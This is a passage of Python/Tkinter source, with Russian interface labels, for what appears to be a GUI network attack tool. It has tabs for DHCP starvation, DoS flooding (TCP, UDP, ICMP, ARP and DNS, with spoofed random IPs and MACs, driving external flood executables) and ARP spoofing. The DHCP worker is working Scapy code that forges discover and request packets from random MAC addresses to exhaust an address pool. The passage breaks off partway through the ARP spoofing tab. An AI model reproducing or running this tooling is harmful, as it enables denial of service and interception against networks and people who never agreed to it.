        status_bar = ttk.Frame(self.root)
        status_bar.pack(side='bottom', fill='x')
        
        ttk.Label(status_bar, textvariable=self.status_var, relief='sunken', 
                 font=('Arial', 8), width=50).pack(side='left', fill='x', expand=True)
        
        self.cpu_label = ttk.Label(status_bar, text="CPU: 0%", relief='sunken', 
                                  font=('Arial', 8), width=12)
        self.cpu_label.pack(side='right', padx=(2, 0))
        
        self.ram_label = ttk.Label(status_bar, text="RAM: 0%", relief='sunken', 
                                  font=('Arial', 8), width=12)
        self.ram_label.pack(side='right', padx=(2, 10))
    
    # ----- DHCP Starvation Tab -----
    def setup_dhcp_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)
        
        params_frame = ttk.LabelFrame(left_frame, text="Параметры DHCP Starvation")
        params_frame.pack(fill='x', padx=5, pady=5)
        
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=5)
        ttk.Label(row1, text="Интерфейс:", width=12).pack(side='left', padx=2)
        self.dhcp_interface = ttk.Combobox(row1, width=25, font=('Arial', 9), values=self.network_interfaces)
        self.dhcp_interface.pack(side='left', padx=2)
        self.dhcp_interface.set(self.network_interfaces[0] if self.network_interfaces else "Ethernet")
        
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=5)
        ttk.Label(row2, text="Размер пула:", width=12).pack(side='left', padx=2)
        self.dhcp_pool_size = ttk.Entry(row2, width=10, font=('Arial', 9))
        self.dhcp_pool_size.pack(side='left', padx=2)
        self.dhcp_pool_size.insert(0, "254")
        
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=5)
        ttk.Label(row3, text="Кол-во запросов:", width=12).pack(side='left', padx=2)
        self.dhcp_request_count = ttk.Entry(row3, width=10, font=('Arial', 9))
        self.dhcp_request_count.pack(side='left', padx=2)
        self.dhcp_request_count.insert(0, "1000")
        
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=5)
        ttk.Label(row4, text="Задержка (сек):", width=12).pack(side='left', padx=2)
        self.dhcp_delay = ttk.Entry(row4, width=10, font=('Arial', 9))
        self.dhcp_delay.pack(side='left', padx=2)
        self.dhcp_delay.insert(0, "0.05")
        
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        
        self.dhcp_start_btn = ttk.Button(button_frame, text="Начать DHCP Starvation", 
                                       command=self.start_dhcp_attack, width=20)
        self.dhcp_start_btn.pack(side='left', padx=5)
        
        self.dhcp_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                      command=self.stop_dhcp_attack, width=15, state='disabled')
        self.dhcp_stop_btn.pack(side='left', padx=5)
        
        stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
        stats_frame.pack(fill='x', padx=5, pady=5)
        
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.dhcp_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Скорость (pps):", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_rate = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.dhcp_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Уникальных MAC:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_unique = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.dhcp_unique.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=3, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.dhcp_time.grid(row=3, column=1, padx=5, pady=2, sticky='w')
        
        log_frame = ttk.LabelFrame(right_frame, text="Лог DHCP Starvation")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.dhcp_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
        self.dhcp_log.pack(fill='both', expand=True, padx=5, pady=5)
        
        btn_frame = ttk.Frame(log_frame)
        btn_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(btn_frame, text="Сохранить лог", 
                  command=lambda: self.save_log(self.dhcp_log), width=14).pack()
        
        self.dhcp_stats = {
            'start_time': 0,
            'sent_packets': 0,
            'unique_macs': set(),
            'last_update': 0,
            'last_sent': 0
        }
    
    def start_dhcp_attack(self):
        self.dhcp_attack_running = True
        self.dhcp_start_btn.config(state='disabled')
        self.dhcp_stop_btn.config(state='normal')
        
        try:
            pool_size = int(self.dhcp_pool_size.get())
            request_count = int(self.dhcp_request_count.get())
            delay = float(self.dhcp_delay.get())
        except:
            pool_size = 254
            request_count = 1000
            delay = 0.005
        
        self.dhcp_stats = {
            'start_time': time.time(),
            'sent_packets': 0,
            'unique_macs': set(),
            'last_update': time.time(),
            'last_sent': 0
        }
        
        self.dhcp_thread = threading.Thread(
            target=self.dhcp_attack_worker,
            args=(self.dhcp_interface.get(), pool_size, request_count, delay)
        )
        self.dhcp_thread.daemon = True
        self.dhcp_thread.start()
        
        self.update_dhcp_stats()
        
        self.dhcp_log.insert('end', f"DHCP Starvation started (pool size: {pool_size} IPs)\n")
        self.dhcp_log.insert('end', f"Interface: {self.dhcp_interface.get()}\n")
        self.status_var.set("DHCP Starvation запущена")
    
    def stop_dhcp_attack(self):
        self.dhcp_attack_running = False
        self.dhcp_start_btn.config(state='normal')
        self.dhcp_stop_btn.config(state='disabled')
        
        if self.dhcp_thread and self.dhcp_thread.is_alive():
            self.dhcp_thread.join(timeout=1.0)
        
        total_time = time.time() - self.dhcp_stats['start_time']
        total_packets = self.dhcp_stats['sent_packets']
        total_bytes = total_packets * 590  # approx packet size
        
        self.dhcp_log.insert('end', "\n--- Results ---\n")
        self.dhcp_log.insert('end', f"Total packets sent: {total_packets}\n")
        self.dhcp_log.insert('end', f"Unique MACs: {len(self.dhcp_stats['unique_macs'])}\n")
        self.dhcp_log.insert('end', f"Duration: {total_time*1000:.0f} ms\n")
        if total_time > 0:
            self.dhcp_log.insert('end', f"Avg rate: {int(total_packets/total_time)} pps\n")
        self.dhcp_log.insert('end', f"Total data: {total_bytes} bytes\n")
        self.dhcp_log.insert('end', f"Throughput: {(total_bytes*8/total_time/1e6):.2f} Mbps\n")
        
        self.status_var.set("DHCP Starvation остановлена")
    
    def update_dhcp_stats(self):
        if not self.dhcp_attack_running:
            return
            
        current_time = time.time()
        duration = current_time - self.dhcp_stats['start_time']
        time_diff = current_time - self.dhcp_stats['last_update']
        
        if time_diff >= 1:
            packets_sent = self.dhcp_stats['sent_packets'] - self.dhcp_stats.get('last_sent', 0)
            current_rate = packets_sent / time_diff if time_diff > 0 else 0
            
            self.dhcp_rate.config(text=f"{int(current_rate)}")
            self.dhcp_stats['last_update'] = current_time
            self.dhcp_stats['last_sent'] = self.dhcp_stats['sent_packets']
        
        self.dhcp_sent.config(text=str(self.dhcp_stats['sent_packets']))
        self.dhcp_unique.config(text=str(len(self.dhcp_stats['unique_macs'])))
        
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.dhcp_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        
        if self.dhcp_attack_running:
            self.root.after(1000, self.update_dhcp_stats)
    
    def dhcp_attack_worker(self, interface, pool_size, request_count, delay):
        try:
            packet_count = 0
            used_macs = set()
            
            while self.dhcp_attack_running and packet_count < request_count:
                mac = self.generate_random_mac()
                if mac in used_macs:
                    continue
                    
                used_macs.add(mac)
                mac_bytes = bytes.fromhex(mac.replace(':', ''))
                
                dhcp_discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                               IP(src="0.0.0.0", dst="255.255.255.255") / \
                               UDP(sport=68, dport=67) / \
                               BOOTP(chaddr=mac_bytes, xid=random.randint(1, 0xFFFFFFFF)) / \
                               DHCP(options=[("message-type", "discover"), "end"])
                
                sendp(dhcp_discover, iface=interface, verbose=0)
                packet_count += 1
                self.dhcp_stats['sent_packets'] = packet_count
                self.dhcp_stats['unique_macs'] = used_macs
                
                if delay > 0:
                    time.sleep(delay)
                
                dhcp_request = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                              IP(src="0.0.0.0", dst="255.255.255.255") / \
                              UDP(sport=68, dport=67) / \
                              BOOTP(chaddr=mac_bytes, xid=random.randint(1, 0xFFFFFFFF)) / \
                              DHCP(options=[("message-type", "request"), "end"])
                
                sendp(dhcp_request, iface=interface, verbose=0)
                packet_count += 1
                self.dhcp_stats['sent_packets'] = packet_count
                
                if packet_count % 20 == 0:
                    self.status_var.set(f"DHCP Starvation: {packet_count}/{request_count}")
                
                if delay > 0:
                    time.sleep(delay)
                
                if len(used_macs) >= pool_size:
                    used_macs.clear()
                    time.sleep(1)
            
            if packet_count >= request_count:
                self.dhcp_log.insert('end', f"DHCP Starvation finished. Sent {packet_count} packets\n")
                self.stop_dhcp_attack()
                        
        except Exception as e:
            self.dhcp_log.insert('end', f"DHCP Starvation error: {str(e)}\n")
            self.stop_dhcp_attack()
    
    # ----- DoS Attack Tab -----
    def setup_custom_attack_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)
        
        params_frame = ttk.LabelFrame(left_frame, text="Параметры DoS атаки")
        params_frame.pack(fill='x', padx=5, pady=5)
        
        # Целевой IP
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=5)
        ttk.Label(row1, text="IP адрес:", width=12).pack(side='left', padx=2)
        self.custom_ip = ttk.Entry(row1, width=25, font=('Arial', 9))
        self.custom_ip.pack(side='left', padx=2)
        self.custom_ip.insert(0, "192.168.1.1")
        
        # Протокол
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=5)
        ttk.Label(row2, text="Протокол:", width=12).pack(side='left', padx=2)
        self.custom_protocol = ttk.Combobox(row2, values=[
            "ICMP", "TCP", "UDP", "ARP", "DNS"
        ], width=15, font=('Arial', 9))
        self.custom_protocol.pack(side='left', padx=2)
        self.custom_protocol.set("TCP")
        self.custom_protocol.bind('<<ComboboxSelected>>', self.on_protocol_change)
        
        # Порт (будет скрыт для некоторых протоколов)
        self.custom_port_frame = ttk.Frame(params_frame)
        self.custom_port_frame.pack(fill='x', padx=5, pady=5)
        ttk.Label(self.custom_port_frame, text="Порт:", width=12).pack(side='left', padx=2)
        self.custom_port = ttk.Entry(self.custom_port_frame, width=10, font=('Arial', 9))
        self.custom_port.pack(side='left', padx=2)
        self.custom_port.insert(0, "80")
        
        # Размер пакета
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=5)
        ttk.Label(row4, text="Размер пакета:", width=12).pack(side='left', padx=2)
        self.custom_packet_size = ttk.Entry(row4, width=10, font=('Arial', 9))
        self.custom_packet_size.pack(side='left', padx=2)
        self.custom_packet_size.insert(0, "1024")
        ttk.Label(row4, text="байт").pack(side='left', padx=2)
        
        # Время (сек)
        row5 = ttk.Frame(params_frame)
        row5.pack(fill='x', padx=5, pady=5)
        ttk.Label(row5, text="Время (сек):", width=12).pack(side='left', padx=2)
        self.custom_packet_count = ttk.Entry(row5, width=10, font=('Arial', 9))
        self.custom_packet_count.pack(side='left', padx=2)
        self.custom_packet_count.insert(0, "60")
        ttk.Label(row5, text="0 = бесконечно").pack(side='left', padx=6)
        
        # Фрейм для дополнительных опций (случайный IP/MAC)
        self.custom_options_frame = ttk.Frame(params_frame)
        self.custom_random_ip = tk.BooleanVar(value=False)
        self.custom_random_mac = tk.BooleanVar(value=False)
        ttk.Checkbutton(self.custom_options_frame, text="Случайный IP", variable=self.custom_random_ip).pack(side='left', padx=5)
        ttk.Checkbutton(self.custom_options_frame, text="Случайный MAC", variable=self.custom_random_mac).pack(side='left', padx=5)
        self.custom_options_frame.pack(fill='x', padx=5, pady=5)
        self.custom_options_frame.pack_forget()  # изначально скрыт
        
        # Интерфейс
        self.custom_row7 = ttk.Frame(params_frame)
        self.custom_row7.pack(fill='x', padx=5, pady=5)
        ttk.Label(self.custom_row7, text="Интерфейс:", width=12).pack(side='left', padx=2)
        self.custom_interface = ttk.Combobox(self.custom_row7, width=25, font=('Arial', 9), values=self.network_interfaces)
        self.custom_interface.pack(side='left', padx=2)
        self.custom_interface.set(self.network_interfaces[0] if self.network_interfaces else "Ethernet")
        
        # Кнопки
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        
        self.custom_start_btn = ttk.Button(button_frame, text="Начать DoS атаку", 
                                         command=self.start_custom_attack, width=15)
        self.custom_start_btn.pack(side='left', padx=5)
        
        self.custom_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                        command=self.stop_custom_attack, width=15, state='disabled')
        self.custom_stop_btn.pack(side='left', padx=5)
        
        # Статистика
        stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
        stats_frame.pack(fill='x', padx=5, pady=5)
        
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.custom_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.custom_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Скорость (pps):", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.custom_rate = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.custom_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.custom_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.custom_time.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        
        # Лог
        log_frame = ttk.LabelFrame(right_frame, text="Лог DoS атаки")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.custom_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
        self.custom_log.pack(fill='both', expand=True, padx=5, pady=5)
        
        btn_frame = ttk.Frame(log_frame)
        btn_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(btn_frame, text="Сохранить лог", 
                  command=lambda: self.save_log(self.custom_log), width=14).pack()
        
        self.custom_attack_stats = {
            'start_time': 0,
            'sent_packets': 0,
            'received_packets': 0,
            'last_update': 0,
            'last_sent': 0,
            'total_bytes': 0
        }
        
        # Начальное состояние протокола
        self.on_protocol_change()
    
    def on_protocol_change(self, event=None):
        proto = self.custom_protocol.get()
        
        # Управление видимостью поля "Порт"
        if proto in ["TCP", "UDP"]:
            self.custom_port_frame.pack(fill='x', padx=5, pady=5, before=self.custom_options_frame
                                        if self.custom_options_frame.winfo_ismapped() else self.custom_row7)
        else:
            self.custom_port_frame.pack_forget()
        
        # Управление видимостью дополнительных опций (случайный IP/MAC)
        if proto in ["TCP", "ARP", "ICMP"]:
            self.custom_options_frame.pack(fill='x', padx=5, pady=5, before=self.custom_row7)
        else:
            self.custom_options_frame.pack_forget()
    
    def run_external_tool(self, args, log_widget, stop_event, infinite=False, on_finish=None, stats_callback=None):
        try:
            proc = subprocess.Popen(
                args,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                stdin=subprocess.PIPE if infinite else None,
                text=True,
                bufsize=1,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            self.current_external_process = proc
            
            for line in iter(proc.stdout.readline, ''):
                line = line.strip()
                if not line:
                    continue
                # Пытаемся распарсить JSON
                try:
                    data = json.loads(line)
                    if data.get('type') == 'stats':
                        # Это статистика – обновляем GUI
                        if stats_callback:
                            self.root.after(0, stats_callback, data)
                        # Выводим краткую запись в лог
                        elapsed = data.get('time', 0)
                        pps = data.get('pps', 0)
                        packets = data.get('packets', 0)
                        log_widget.insert('end', f"{elapsed}s: {pps} pps (total: {packets})\n")
                        log_widget.see('end')
                    else:
                        # Другой JSON (параметры) – выводим как есть
                        log_widget.insert('end', line + '\n')
                        log_widget.see('end')
                except json.JSONDecodeError:
                    # Обычный текст – выводим
                    log_widget.insert('end', line + '\n')
                    log_widget.see('end')
                
                if stop_event.is_set():
                    if infinite and proc.poll() is None:
                        proc.stdin.write('\n')
                        proc.stdin.flush()
                    else:
                        proc.terminate()
                    break
            
            proc.wait()
        except Exception as e:
            log_widget.insert('end', f"External process error: {str(e)}\n")
        finally:
            self.current_external_process = None
            log_widget.insert('end', "External process finished.\n")
            if on_finish:
                self.root.after(0, on_finish)
                
    def update_external_stats(self, data):
        """Обновляет статистику из JSON-сообщений внешнего процесса."""
        if not self.custom_attack_running:
            return
        packets = data.get('packets', 0)
        pps = data.get('pps', 0)
        elapsed = data.get('time', 0)
        self.custom_sent.config(text=f"{packets}")
        self.custom_rate.config(text=f"{pps}")
        hours = elapsed // 3600
        minutes = (elapsed % 3600) // 60
        seconds = elapsed % 60
        self.custom_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
    
    def start_custom_attack(self):
        if self.custom_attack_running:
            return
            
        self.custom_attack_running = True
        self.custom_start_btn.config(state='disabled')
        self.custom_stop_btn.config(state='normal')
        
        try:
            target_ip = self.custom_ip.get()
            protocol = self.custom_protocol.get()
            port = int(self.custom_port.get()) if protocol in ["TCP", "UDP"] else 0
            packet_size = int(self.custom_packet_size.get())
            duration = int(self.custom_packet_count.get())
            continuous = duration == 0
            interface = self.custom_interface.get()
            random_ip = self.custom_random_ip.get()
            random_mac = self.custom_random_mac.get()

            if duration < 0:
                raise ValueError("Время атаки не может быть отрицательным")
            
            # Сохраняем тип атаки
            self.current_attack_type = protocol
            self.external_infinite = continuous and protocol in ["TCP", "ARP", "ICMP"]
            
            # Очищаем лог и выводим минимальную информацию
            self.custom_log.delete(1.0, tk.END)
            self.custom_log.insert('end', f"{protocol} flood started\n")
            self.custom_log.insert('end', f"Target: {target_ip}" + (f":{port}" if protocol in ["TCP","UDP"] else "") + "\n")
            self.custom_log.insert('end', f"Interface: {interface}\n")
            if protocol in ["TCP", "ARP", "ICMP"]:
                self.custom_log.insert('end', f"Random IP: {'yes' if random_ip else 'no'}, Random MAC: {'yes' if random_mac else 'no'}\n")
            
            if protocol == "UDP":
                self.raw_attack.start_udp_attack(
                    target_ip, port, packet_size, duration, 
                    continuous, interface, self._log_custom,
                    on_complete=lambda: self.root.after(0, self.on_internal_finished)
                )
            elif protocol == "ICMP":
                exe_path = find_exe("icmp.exe")
                if not os.path.exists(exe_path):
                    self.custom_log.insert('end', "Error: icmp.exe not found!\n")
                    self.stop_custom_attack()
                    return
                try:
                    src_ip = get_if_addr(interface)
                    if not src_ip or src_ip == '0.0.0.0':
                        src_ip = "192.168.1.100"
                except:
                    src_ip = "192.168.1.100"
                threads = 4
                args = [exe_path, src_ip, target_ip, str(threads), str(duration)]
                if random_ip:
                    args.append("--random-ip")
                if random_mac:
                    args.append("--random-mac")
                self.custom_stop_event = threading.Event()
                self.custom_external_thread = threading.Thread(
                    target=self.run_external_tool,
                    args=(args, self.custom_log, self.custom_stop_event),
                    kwargs={'infinite': self.external_infinite, 'on_finish': self.on_external_finished},
                    daemon=True
                )
                self.custom_external_thread.start()
            elif protocol == "TCP":
                exe_path = find_exe("tcp.exe")
                if not os.path.exists(exe_path):
                    self.custom_log.insert('end', "Error: tcp.exe not found!\n")
                    self.stop_custom_attack()
                    return
                try:
                    src_ip = get_if_addr(interface)
                    if not src_ip or src_ip == '0.0.0.0':
                        src_ip = "192.168.1.100"
                except:
                    src_ip = "192.168.1.100"
                threads = 4
                args = [exe_path, src_ip, target_ip, str(port), str(threads), str(duration)]
                if random_ip:
                    args.append("--random-ip")
                if random_mac:
                    args.append("--random-mac")
                self.custom_stop_event = threading.Event()
                self.custom_external_thread = threading.Thread(
                    target=self.run_external_tool,
                    args=(args, self.custom_log, self.custom_stop_event),
                    kwargs={'infinite': self.external_infinite, 'on_finish': self.on_external_finished},
                    daemon=True
                )
                self.custom_external_thread.start()
            elif protocol == "ARP":
                exe_path = find_exe("arp.exe")
                if not os.path.exists(exe_path):
                    self.custom_log.insert('end', "Error: arp.exe not found!\n")
                    self.stop_custom_attack()
                    return
                try:
                    src_ip = get_if_addr(interface)
                    if not src_ip or src_ip == '0.0.0.0':
                        src_ip = "192.168.1.100"
                except:
                    src_ip = "192.168.1.100"
                threads = 4
                args = [exe_path, src_ip, target_ip, str(threads), str(duration)]
                if random_ip:
                    args.append("--random-ip")
                if random_mac:
                    args.append("--random-mac")
                self.custom_stop_event = threading.Event()
                self.custom_external_thread = threading.Thread(
                    target=self.run_external_tool,
                    args=(args, self.custom_log, self.custom_stop_event),
                    kwargs={'infinite': self.external_infinite, 'on_finish': self.on_external_finished},
                    daemon=True
                )
                self.custom_external_thread.start()
            elif protocol == "DNS":
                self.scapy_attack.start_dns_attack(
                    target_ip, duration, continuous, interface, self._log_custom,
                    on_complete=lambda: self.root.after(0, self.on_internal_finished)
                )
            
            # Для внутренних атак запускаем обновление статистики
            if protocol in ["UDP", "DNS"]:
                self.custom_attack_stats = {
                    'start_time': time.time(),
                    'sent_packets': 0,
                    'received_packets': 0,
                    'last_update': time.time(),
                    'last_sent': 0,
                    'total_bytes': 0
                }
                self.update_custom_attack_stats()
            
            self.status_var.set(f"DoS атака запущена: {protocol} → {target_ip}")
            
        except ValueError as e:
            messagebox.showerror("Ошибка", f"Некорректные параметры:\n{str(e)}")
            self.stop_custom_attack()
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось запустить атаку:\n{str(e)}")
            self.stop_custom_attack()

    def _log_custom(self, message):
        self.custom_log.insert('end', f"{message}\n")
        self.custom_log.see('end')

    def _show_internal_results(self, final_stats):
        if not final_stats:
            return

        total_packets = final_stats['total_sent']
        total_bytes = final_stats['total_bytes']
        total_time = time.time() - final_stats['start_time']
        self.custom_log.insert('end', "\n--- Results ---\n")
        self.custom_log.insert('end', f"Total packets sent: {total_packets}\n")
        self.custom_log.insert('end', f"Duration: {total_time*1000:.0f} ms\n")
        if total_time > 0:
            self.custom_log.insert('end', f"Avg rate: {int(total_packets/total_time)} pps\n")
        self.custom_log.insert('end', f"Total data: {total_bytes} bytes\n")
        if total_time > 0:
            self.custom_log.insert('end', f"Throughput: {(total_bytes*8/total_time/1e6):.2f} Mbps\n")

    def on_internal_finished(self):
        if not self.custom_attack_running or self.current_attack_type not in ["UDP", "DNS"]:
            return

        final_stats = None
        if self.current_attack_type == "UDP":
            with self.raw_attack.stats_lock:
                final_stats = self.raw_attack.stats.copy()
        elif self.current_attack_type == "DNS":
            with self.scapy_attack.stats_lock:
                final_stats = self.scapy_attack.stats.copy()

        self._show_internal_results(final_stats)
        self.custom_attack_running = False
        self.custom_start_btn.config(state='normal')
        self.custom_stop_btn.config(state='disabled')
        self.status_var.set("DoS атака завершена")
        self.current_attack_type = None
        self.external_infinite = False
    
    
    def on_external_finished(self):
        """Вызывается после завершения внешнего процесса (по таймеру или по Enter)."""
        self.custom_attack_running = False
        self.custom_start_btn.config(state='normal')
        self.custom_stop_btn.config(state='disabled')
        self.status_var.set("DoS атака завершена")
    
    def stop_custom_attack(self):
        if not self.custom_attack_running:
            return

        # Если это внешняя атака и процесс ещё жив
        if self.current_attack_type in ["TCP", "ARP", "ICMP"] and self.current_external_process:
            # Если процесс в бесконечном режиме, посылаем Enter для корректного завершения
            if self.external_infinite and self.current_external_process.poll() is None:
                try:
                    self.current_external_process.stdin.write('\n')
                    self.current_external_process.stdin.flush()
                except:
                    pass
            
            # Устанавливаем событие остановки, чтобы поток чтения завершился
            if self.custom_stop_event:
                self.custom_stop_event.set()
            
            # Даём процессу немного времени на завершение (до 1 секунды)
            try:
                self.current_external_process.wait(timeout=1)
            except subprocess.TimeoutExpired:
                # Если не завершился, принудительно убиваем
                self.current_external_process.kill()
                self.current_external_process.wait()  # ждём завершения после kill

        # Если это внутренняя атака, останавливаем движки и выводим статистику
        if self.current_attack_type in ["UDP", "DNS"]:
            if self.raw_attack.running:
                final_stats = self.raw_attack.stop()
            elif self.scapy_attack.running:
                final_stats = self.scapy_attack.stop()
            else:
                final_stats = None
            self._show_internal_results(final_stats)

        # Сбрасываем флаги
        self.custom_attack_running = False
        self.custom_start_btn.config(state='normal')
        self.custom_stop_btn.config(state='disabled')
        self.status_var.set("DoS атака остановлена")
        self.current_attack_type = None
        self.external_infinite = False
    
    def update_custom_attack_stats(self):
        if not self.custom_attack_running:
            return
            
        current_time = time.time()
        if self.raw_attack.running:
            with self.raw_attack.stats_lock:
                sent_packets = self.raw_attack.stats['total_sent']
                rate = self.raw_attack.stats['current_pps']
                self.custom_rate.config(text=f"{rate}")
        elif self.scapy_attack.running:
            with self.scapy_attack.stats_lock:
                sent_packets = self.scapy_attack.stats['total_sent']
        else:
            sent_packets = 0
        
        self.custom_sent.config(text=f"{sent_packets}")
        
        duration = current_time - self.custom_attack_stats['start_time']
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.custom_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        
        if self.custom_attack_running:
            self.root.after(1000, self.update_custom_attack_stats)
    
    # ----- ARP Spoofing Tab -----
    def setup_arp_spoof_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)

        params_frame = ttk.LabelFrame(left_frame, text="Параметры ARP Spoofing")
        params_frame.pack(fill='x', padx=5, pady=5)
        
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=5)
        ttk.Label(row1, text="IP цели:", width=12).pack(side='left', padx=2)
        self.arp_target_ip = ttk.Entry(row1, width=25, font=('Arial', 9))
        self.arp_target_ip.pack(side='left', padx=2)
        self.arp_target_ip.insert(0, "192.168.1.2")
        
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=5)
        ttk.Label(row2, text="IP шлюза:", width=12).pack(side='left', padx=2)
        self.arp_gateway_ip = ttk.Entry(row2, width=25, font=('Arial', 9))
        self.arp_gateway_ip.pack(side='left', padx=2)
        self.arp_gateway_ip.insert(0, "192.168.1.1")
        
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=5)
        ttk.Label(row3, text="Интерфейс:", width=12).pack(side='left', padx=2)
        self.arp_spoof_interface = ttk.Combobox(row3, width=25, font=('Arial', 9), values=self.network_interfaces)
        self.arp_spoof_interface.pack(side='left', padx=2)
        self.arp_spoof_interface.set(self.network_interfaces[0] if self.network_interfaces else "Ethernet")
        
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=5)
        ttk.Label(row4, text="Интервал (сек):", width=12).pack(side='left', padx=2)
        self.arp_spoof_interval = ttk.Entry(row4, width=10, font=('Arial', 9))
        self.arp_spoof_interval.pack(side='left', padx=2)
        self.arp_spoof_interval.insert(0, "2")
        
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        
        self.arp_spoof_start_btn = ttk.Button(button_frame, text="Начать ARP Spoofing", 
                                            command=self.start_arp_spoof, width=18)
        self.arp_spoof_start_btn.pack(side='left', padx=5)
        
        self.arp_spoof_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                           command=self.stop_arp_spoof, width=15, state='disabled')
        self.arp_spoof_stop_btn.pack(side='left', padx=5)
        
        stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
        stats_frame.pack(fill='x', padx=5, pady=5)
        
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.arp_spoof_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.arp_spoof_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Скорость (pps):", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.arp_spoof_rate = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.arp_spoof_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.arp_spoof_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.arp_spoof_time.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        
        log_frame = ttk.LabelFrame(right_frame, text="Лог ARP Spoofing")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
